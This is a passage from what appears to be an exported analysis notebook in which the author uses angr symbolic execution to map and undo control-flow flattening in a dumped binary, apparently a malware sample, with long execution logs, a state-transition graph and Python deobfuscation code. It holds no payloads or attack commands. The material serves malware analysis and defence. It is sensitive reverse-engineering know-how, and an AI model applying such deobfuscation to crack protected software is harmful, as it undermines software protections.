@ 0x7ff6c4b0691a&gt;] ... Only found a single sucessor: 0x7ff6c4b0694d eax: &lt;BV32 fake_ret_value_26_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0694d&gt;] ... . WARNING | 2022-03-31 15:04:33,940 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff34 with 4 unconstrained bytes referenced from 0x7ff6c4b06c61 (offset 0x6c61 in pandora_dump_SCY.bin (0x7ff6c4b06c61)) WARNING | 2022-03-31 15:04:34,025 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff38 with 4 unconstrained bytes referenced from 0x7ff6c4b07045 (offset 0x7045 in pandora_dump_SCY.bin (0x7ff6c4b07045)) . Only found a single sucessor: 0x7ff6c4b06976 eax: &lt;BV32 fake_ret_value_29_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06976&gt;] ... Only found a single sucessor: 0x7ff6c4b06992 eax: &lt;BV32 fake_ret_value_30_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06992&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0x7a980236&gt; 0x10bc6c78 &lt;SimState @ 0x7ff6c4b06992&gt; =&gt; [&#39;0x7a980236&#39;] eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06847 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06847&gt;] ... Only found a single sucessor: 0x7ff6c4b06c45 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c45&gt;] ... Only found a single sucessor: 0x7ff6c4b06c61 eax: &lt;BV32 0xa22a16af&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c61&gt;] ... Only found a single sucessor: 0x7ff6c4b06c85 eax: &lt;BV32 fake_ret_value_32_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c85&gt;] ... Only found a single sucessor: 0x7ff6c4b06ca6 eax: &lt;BV32 fake_ret_value_33_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ca6&gt;] ... Only found a single sucessor: 0x7ff6c4b06cb9 eax: &lt;BV32 fake_ret_value_34_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06cb9&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if fake_ret_value_34_64{UNINITIALIZED}[31:0] == 0x0 then 0x7d71a1e3 else 0x3cd69d30&gt; 0xa22a16af &lt;SimState @ 0x7ff6c4b06cb9&gt; =&gt; [&#39;0x3cd69d30&#39;, &#39;0x7d71a1e3&#39;] eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b06b09 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b09&gt;] ... Only found a single sucessor: 0x7ff6c4b07008 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07008&gt;] ... Only found a single sucessor: 0x7ff6c4b07024 eax: &lt;BV32 0x3cd69d30&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07024&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xc30bae2e&gt; 0x3cd69d30 &lt;SimState @ 0x7ff6c4b07024&gt; =&gt; [&#39;0xc30bae2e&#39;] eax: &lt;BV32 0x7d71a1e3&gt; . WARNING | 2022-03-31 15:04:34,058 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b06c1c (offset 0x6c1c in pandora_dump_SCY.bin (0x7ff6c4b06c1c)) WARNING | 2022-03-31 15:04:34,096 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff2c with 4 unconstrained bytes referenced from 0x7ff6c4b06a04 (offset 0x6a04 in pandora_dump_SCY.bin (0x7ff6c4b06a04)) WARNING | 2022-03-31 15:04:34,099 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) WARNING | 2022-03-31 15:04:34,102 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b06a22 (offset 0x6a22 in pandora_dump_SCY.bin (0x7ff6c4b06a22)) WARNING | 2022-03-31 15:04:34,220 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff3c with 4 unconstrained bytes referenced from 0x7ff6c4b06b3b (offset 0x6b3b in pandora_dump_SCY.bin (0x7ff6c4b06b3b)) . Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06bbb eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bbb&gt;] ... Only found a single sucessor: 0x7ff6c4b06bd7 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bd7&gt;] ... Only found a single sucessor: 0x7ff6c4b06bf3 eax: &lt;BV32 0x7d71a1e3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bf3&gt;] ... Only found a single sucessor: 0x7ff6c4b06c0f eax: &lt;BV32 fake_ret_value_36_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c0f&gt;] ... Only found a single sucessor: 0x7ff6c4b06c40 eax: &lt;BV32 fake_ret_value_38_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06c40&gt;] ... Only found a single sucessor: 0x7ff6c4b06ecc eax: &lt;BV32 fake_ret_value_38_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ecc&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xa2992627&gt; 0x7d71a1e3 &lt;SimState @ 0x7ff6c4b06ecc&gt; =&gt; [&#39;0xa2992627&#39;] eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b069b0 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069b0&gt;] ... Only found a single sucessor: 0x7ff6c4b069cc eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069cc&gt;] ... Only found a single sucessor: 0x7ff6c4b069e8 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069e8&gt;] ... Only found a single sucessor: 0x7ff6c4b06a04 eax: &lt;BV32 0xc30bae2e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a04&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if 0x5b &lt;= mem_7fffffffffeff26_40_16{UNINITIALIZED} then 0x6c249751 else 0x3b2b8a1e&gt; 0xc30bae2e &lt;SimState @ 0x7ff6c4b06a04&gt; =&gt; [&#39;0x6c249751&#39;, &#39;0x3b2b8a1e&#39;] eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06a99 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a99&gt;] ... Only found a single sucessor: 0x7ff6c4b06ab5 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ab5&gt;] ... Only found a single sucessor: 0x7ff6c4b06ad1 eax: &lt;BV32 0xa2992627&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ad1&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xecce8ff1&gt; 0xa2992627 &lt;SimState @ 0x7ff6c4b06ad1&gt; =&gt; [&#39;0xecce8ff1&#39;] eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06a4c eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a4c&gt;] ... Only found a single sucessor: 0x7ff6c4b06a68 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a68&gt;] ... Only found a single sucessor: 0x7ff6c4b06a84 eax: &lt;BV32 0x6c249751&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a84&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0x7d71a1e3&gt; 0x6c249751 &lt;SimState @ 0x7ff6c4b06a84&gt; =&gt; [&#39;0x7d71a1e3&#39;] eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b06b09 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b09&gt;] ... Only found a single sucessor: 0x7ff6c4b06b20 eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b20&gt;] ... Only found a single sucessor: 0x7ff6c4b06b3b eax: &lt;BV32 0x3b2b8a1e&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b3b&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if mem_7fffffffffeff3c_42_32{UNINITIALIZED}[0:0] == 0 then 0xd43fb344 else 0xc094d6c9&gt; . WARNING | 2022-03-31 15:04:34,280 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff78 with 8 unconstrained bytes referenced from 0x7ff6c4b0706e (offset 0x706e in pandora_dump_SCY.bin (0x7ff6c4b0706e)) WARNING | 2022-03-31 15:04:34,325 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff26 with 2 unconstrained bytes referenced from 0x7ff6c4b06b9f (offset 0x6b9f in pandora_dump_SCY.bin (0x7ff6c4b06b9f)) . 0x3b2b8a1e &lt;SimState @ 0x7ff6c4b06b3b&gt; =&gt; [&#39;0xd43fb344&#39;, &#39;0xc094d6c9&#39;] eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b069b0 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06b63 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b63&gt;] ... Only found a single sucessor: 0x7ff6c4b07052 eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07052&gt;] ... Only found a single sucessor: 0x7ff6c4b0706e eax: &lt;BV32 0xecce8ff1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0706e&gt;] ... Only found a single sucessor: 0x7ff6c4b07090 eax: &lt;BV32 fake_ret_value_44_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b07090&gt;] ... Only found a single sucessor: 0x7ff6c4b070ae eax: &lt;BV32 fake_ret_value_45_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b070ae&gt;] ... Only found a single sucessor: 0xffed89901000 eax: &lt;BV32 0x0&gt; Stepping: [&lt;SimState @ 0xffed89901000&gt;] ... 0xecce8ff1 &lt;SimState @ 0xffed89901000&gt; =&gt; [] eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b069b0 eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b069b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06b63 eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b63&gt;] ... Only found a single sucessor: 0x7ff6c4b06b7f eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b7f&gt;] ... Only found a single sucessor: 0x7ff6c4b06b9b eax: &lt;BV32 0xd43fb344&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06b9b&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xc30bae2e&gt; 0xd43fb344 &lt;SimState @ 0x7ff6c4b06b9b&gt; =&gt; [&#39;0xc30bae2e&#39;] eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06a99 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a99&gt;] ... Only found a single sucessor: 0x7ff6c4b06f3d eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f3d&gt;] ... Only found a single sucessor: 0x7ff6c4b06f58 eax: &lt;BV32 0xc094d6c9&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f58&gt;] ... Only found a single sucessor: 0x7ff6c4b06f70 eax: &lt;BV32 fake_ret_value_47_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f70&gt;] ... . WARNING | 2022-03-31 15:04:34,651 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff58 with 8 unconstrained bytes referenced from 0x7ff6c4b06f7e (offset 0x6f7e in pandora_dump_SCY.bin (0x7ff6c4b06f7e)) . Only found a single sucessor: 0x7ff6c4b06f9f eax: &lt;BV32 fake_ret_value_49_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06f9f&gt;] ... Only found a single sucessor: 0x7ff6c4b06fc9 eax: &lt;BV32 fake_ret_value_50_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06fc9&gt;] ... Only found a single sucessor: 0x7ff6c4b06ff8 eax: &lt;BV32 fake_ret_value_51_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ff8&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0xd43fb344&gt; 0xc094d6c9 &lt;SimState @ 0x7ff6c4b06ff8&gt; =&gt; [&#39;0xd43fb344&#39;] digraph CFG { &#34;0x8cbc0434&#34; -&gt; &#34;0x7d9d86f3&#34; &#34;0x8cbc0434&#34; -&gt; &#34;0x173ba5e1&#34; &#34;0x173ba5e1&#34; -&gt; &#34;0x7a980236&#34; &#34;0x7a980236&#34; -&gt; &#34;0x10bc6c78&#34; &#34;0x7a980236&#34; -&gt; &#34;0xa22a16af&#34; &#34;0x10bc6c78&#34; -&gt; &#34;0x7a980236&#34; &#34;0xa22a16af&#34; -&gt; &#34;0x3cd69d30&#34; &#34;0xa22a16af&#34; -&gt; &#34;0x7d71a1e3&#34; &#34;0x3cd69d30&#34; -&gt; &#34;0xc30bae2e&#34; &#34;0x7d71a1e3&#34; -&gt; &#34;0xa2992627&#34; &#34;0xc30bae2e&#34; -&gt; &#34;0x6c249751&#34; &#34;0xc30bae2e&#34; -&gt; &#34;0x3b2b8a1e&#34; &#34;0xa2992627&#34; -&gt; &#34;0xecce8ff1&#34; &#34;0x6c249751&#34; -&gt; &#34;0x7d71a1e3&#34; &#34;0x3b2b8a1e&#34; -&gt; &#34;0xd43fb344&#34; &#34;0x3b2b8a1e&#34; -&gt; &#34;0xc094d6c9&#34; &#34;0xd43fb344&#34; -&gt; &#34;0xc30bae2e&#34; &#34;0xc094d6c9&#34; -&gt; &#34;0xd43fb344&#34; } . Display graph . https://dreampuf.github.io/GraphvizOnline/ . CFF State Machine Analysis . import angr import claripy import struct BINARY_PATH = &#39;/tmp/pandora_dump_SCY.bin&#39; entry_point = 0x00007FF6C4B066F0 dispatcher_start = 0x00007FF6C4B067F0 project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # TODO: We should explicately add the state since we know it (main) initial_state = project.factory.call_state(addr=entry_point) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) simgr = project.factory.simgr(initial_state) simgr.active . WARNING | 2022-03-31 15:04:34,837 | angr.calling_conventions | Guessing call prototype. Please specify prototype. . [&lt;SimState @ 0x7ff6c4b066f0&gt;] . simgr.run(until=lambda s: s.active[0].addr == dispatcher_start) print(simgr.active) initial_dispatcher_state = simgr.active[0] eax_initial = initial_dispatcher_state.solver.eval_one(initial_dispatcher_state.regs.eax) print(f&quot;Initial state address {initial_dispatcher_state}&quot;) print(f&quot;Initial eax: {hex(eax_initial)}&quot;) # Save the initial state at the dispatcher initial_dispatcher_state = simgr.active[0] . WARNING | 2022-03-31 15:04:34,859 | angr.storage.memory_mixins.default_filler_mixin | Filling register r15 with 8 unconstrained bytes referenced from 0x7ff6c4b066f0 (offset 0x66f0 in pandora_dump_SCY.bin (0x7ff6c4b066f0)) WARNING | 2022-03-31 15:04:34,861 | angr.storage.memory_mixins.default_filler_mixin | Filling register r14 with 8 unconstrained bytes referenced from 0x7ff6c4b066f2 (offset 0x66f2 in pandora_dump_SCY.bin (0x7ff6c4b066f2)) WARNING | 2022-03-31 15:04:34,863 | angr.storage.memory_mixins.default_filler_mixin | Filling register r13 with 8 unconstrained bytes referenced from 0x7ff6c4b066f4 (offset 0x66f4 in pandora_dump_SCY.bin (0x7ff6c4b066f4)) WARNING | 2022-03-31 15:04:34,865 | angr.storage.memory_mixins.default_filler_mixin | Filling register r12 with 8 unconstrained bytes referenced from 0x7ff6c4b066f6 (offset 0x66f6 in pandora_dump_SCY.bin (0x7ff6c4b066f6)) WARNING | 2022-03-31 15:04:34,866 | angr.storage.memory_mixins.default_filler_mixin | Filling register rsi with 8 unconstrained bytes referenced from 0x7ff6c4b066f8 (offset 0x66f8 in pandora_dump_SCY.bin (0x7ff6c4b066f8)) WARNING | 2022-03-31 15:04:34,868 | angr.storage.memory_mixins.default_filler_mixin | Filling register rdi with 8 unconstrained bytes referenced from 0x7ff6c4b066f9 (offset 0x66f9 in pandora_dump_SCY.bin (0x7ff6c4b066f9)) WARNING | 2022-03-31 15:04:34,870 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x7ff6c4b066fa (offset 0x66fa in pandora_dump_SCY.bin (0x7ff6c4b066fa)) WARNING | 2022-03-31 15:04:34,871 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbx with 8 unconstrained bytes referenced from 0x7ff6c4b066fb (offset 0x66fb in pandora_dump_SCY.bin (0x7ff6c4b066fb)) . [&lt;SimState @ 0x7ff6c4b067f0&gt;] Initial state address &lt;SimState @ 0x7ff6c4b067f0&gt; Initial eax: 0x8cbc0434 . class Flags: def __init__(self, register): self.CF = False self.PF = False self.AF = False self.ZF = False self.SF = False self.TF = False self.IF = False self.DF = False self.OF = False if register &amp; 0x0001 == 0x0001: self.CF = True if register &amp; 0x0004 == 0x0004: self.PF = True if register &amp; 0x0010 == 0x0010: self.AF = True if register &amp; 0x0040 == 0x0040: self.ZF = True if register &amp; 0x0080 == 0x0080: self.SF = True if register &amp; 0x0100 == 0x0100: self.TF = True if register &amp; 0x0200 == 0x0200: self.IF = True if register &amp; 0x0400 == 0x0400: self.DF = True if register &amp; 0x0800 == 0x0800: self.OF = True . state = initial_dispatcher_state.copy() # Original code bb addresses orig_code_bb = [0x7ff6c4b0687f, 0x7ff6c4b0691a, 0x7ff6c4b06a04, 0x7ff6c4b06a84, 0x7ff6c4b06ad1, 0x7ff6c4b06b3b, 0x7ff6c4b06b9b, 0x7ff6c4b06bf3, 0x7ff6c4b06c61, 0x7ff6c4b06cfd, 0x7ff6c4b06e9f, 0x7ff6c4b06ef8, 0x7ff6c4b06f58, 0x7ff6c4b07024] ret_bb = 0x7FF6C4B0706E orig_code_bb.append(ret_bb) # Set symbol for state register eax (32 bit) # eax_state = claripy.BVS(&#39;eax_state&#39;, 4*8) # state.memory.store(state.regs.eax, eax_state) end_bb = 0x7FF6C4B0706E orig_bb_1_start = 0x00007FF6C4B0691A detatched_bb = 0x00007FF6C4B070D1 interrupt_bb = 0x00007FF6C4B070EA # Run from initial state until we hit an original code block simgr_dispatcher = project.factory.simgr(state) while True: simgr_dispatcher.step() print(simgr_dispatcher) if len(simgr_dispatcher.active) != 1: print(f&quot;Multiple states!&quot;) break if simgr_dispatcher.active[0].addr in orig_code_bb: print(f&quot;Found original code block&quot;) break print(f&quot;Step: {hex(simgr_dispatcher.active[0].addr)}&quot;) print(simgr_dispatcher) state_1_end = simgr_dispatcher.active[0] state_1_eax = eax_initial state_1_bb = state_1_end.addr print(f&quot;state_1_eax:{hex(state_1_eax)} -&gt; bb: {hex(state_1_bb)}&quot;) # Run until dispatcher to get new state(s) while True: simgr_dispatcher.step() print(simgr_dispatcher) if len(simgr_dispatcher.active) != 1: print(f&quot;Multiple states!&quot;) break if simgr_dispatcher.active[0].addr == dispatcher_start: print(f&quot;Found dispatcher&quot;) break print(f&quot;Step: {hex(simgr_dispatcher.active[0].addr)}&quot;) # This is the start of state 2 state_2 = simgr_dispatcher.active[0] # Retrieve all potential eax values state_2_eax_values = state_2.solver.eval_upto(state_2.regs.eax, 8) print(f&quot;Number of possible state values: {len(state_2_eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state for state_2_eax_value in state_2_eax_values: print(f&quot;state_2_eax:{hex(state_2_eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = state_2.solver.eval_upto(state_2.regs.flags, 2, extra_constraints=[state_2.regs.eax == state_2_eax_value]) if len(flags_values) == 1: # This is the constrained state we must save these flags with the state print(f&quot;Constrained state: {hex(state_2_eax_value)}&quot;) flags = flags_values[0] print(f&quot;flags:{hex(flags)}&quot;) f = Flags(flags) print(f&quot;CF: {f.CF}&quot;) print(f&quot;PF: {f.PF}&quot;) print(f&quot;AF: {f.AF}&quot;) print(f&quot;ZF: {f.ZF}&quot;) print(f&quot;SF: {f.SF}&quot;) print(f&quot;TF: {f.TF}&quot;) print(f&quot;IF: {f.IF}&quot;) print(f&quot;DF: {f.DF}&quot;) print(f&quot;OF: {f.OF}&quot;) else: # This is the unconstrained state, we don&#39;t need to save anything print(f&quot;Unconstrained state: {hex(state_2_eax_value)}&quot;) . &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06819 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06830 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06847 &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b06863 &lt;SimulationManager with 1 active&gt; Found original code block &lt;SimulationManager with 1 active&gt; state_1_eax:0x8cbc0434 -&gt; bb: 0x7ff6c4b0687f . WARNING | 2022-03-31 15:04:35,337 | angr.storage.memory_mixins.default_filler_mixin | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x7ff6c4b067f0 (offset 0x67f0 in pandora_dump_SCY.bin (0x7ff6c4b067f0)) . &lt;SimulationManager with 1 active&gt; Found dispatcher Number of possible state values: 2 state_2_eax:0x7d9d86f3 Unconstrained state: 0x7d9d86f3 state_2_eax:0x173ba5e1 Constrained state: 0x173ba5e1 flags:0x44 CF: False PF: True AF: False ZF: True SF: False TF: False IF: False DF: False OF: False . # and process both eax states seperately to link each one with their basic block state_2_1 = state_2.copy() state_2_1_eax = state_2_eax_values[0] # Set eax back to a concrete value choosing state_2_1 state_2_1.regs.eax = state.solver.BVV(state_2_1_eax, 32) state_2_2 = state_2.copy() state_2_2_eax = state_2_eax_values[1] # Set eax back to a concrete value choosing state_2_2 state_2_2.regs.eax = state.solver.BVV(state_2_2_eax, 32) . # Solve: state_2_1 ######################## simgr_dispatcher_2_1 = project.factory.simgr(state_2_1) stop_flag = False while True: simgr_dispatcher_2_1.step() print(simgr_dispatcher_2_1) if len(simgr_dispatcher_2_1.active) == 0: print(f&quot;Dead State!&quot;) stop_flag = True break if len(simgr_dispatcher_2_1.active) &gt; 1: print(f&quot;Multiple states: {len(simgr_dispatcher_2_1.active)}!&quot;) stop_flag = True break if simgr_dispatcher_2_1.active[0].addr == detatched_bb: print(f&quot;Found detached block: {hex(simgr_dispatcher_2_1.active[0].addr)}!&quot;) stop_flag = True break if simgr_dispatcher_2_1.active[0].addr in orig_code_bb: print(f&quot;Found original code block&quot;) break print(f&quot;Step: {hex(simgr_dispatcher_2_1.active[0].addr)}&quot;) if not stop_flag: state_2_1_end = simgr_dispatcher_2_1.active[0] state_2_1_bb = state_2_1_end.addr print(f&quot;state_1_eax:{hex(state_2_1_eax)} -&gt; bb: {hex(state_2_1_bb)}&quot;) print(f&quot;** Find next state(s)&quot;) # This is the start of state 3 state_3 = simgr_dispatcher_2_1.active[0] # Retrieve all potential eax values state_3_eax_values = state_3.solver.eval_upto(state_3.regs.eax, 8) print(f&quot;Number of possible state values: {len(state_3_eax_values)}&quot;) # If there is more than one next state that means our code block will require a conditional jmp to replace # the state machine, we will need to find end process both next states as well as determine what conditions # cause each state if len(state_3_eax_values) == 1: state_3_eax_value = state_3_eax_values[0] print(f&quot;Unconditonal JMP - State eax: {hex(state_3_eax_value)}&quot;) else: for state_3_eax_value in state_3_eax_values: print(f&quot;state_3_eax:{hex(state_3_eax_value)}&quot;) # For each eax state we are going to need the associated flags to eventually replace the conditional # cmov with a conditional jmp flags_values = state_3.solver.eval_upto(state_3.regs.flags, 2, extra_constraints=[state_3.regs.eax == state_3_eax_value]) if len(flags_values) == 1: # This is the constrained state we must save these flags with the state print(f&quot;Constrained state: {hex(state_3_eax_value)}&quot;) flags = flags_values[0] print(f&quot;flags:{hex(flags)}&quot;) f = Flags(flags) print(f&quot;CF: {f.CF}&quot;) print(f&quot;PF: {f.PF}&quot;) print(f&quot;AF: {f.AF}&quot;) print(f&quot;ZF: {f.ZF}&quot;) print(f&quot;SF: {f.SF}&quot;) print(f&quot;TF: {f.TF}&quot;) print(f&quot;IF: {f.IF}&quot;) print(f&quot;DF: {f.DF}&quot;) print(f&quot;OF: {f.OF}&quot;) else: # This is the unconstrained state, we don&#39;t need to save anything print(f&quot;Unconstrained state: {hex(state_3_eax_value)}&quot;) . &lt;SimulationManager with 1 active&gt; Step: 0x7ff6c4b068b0 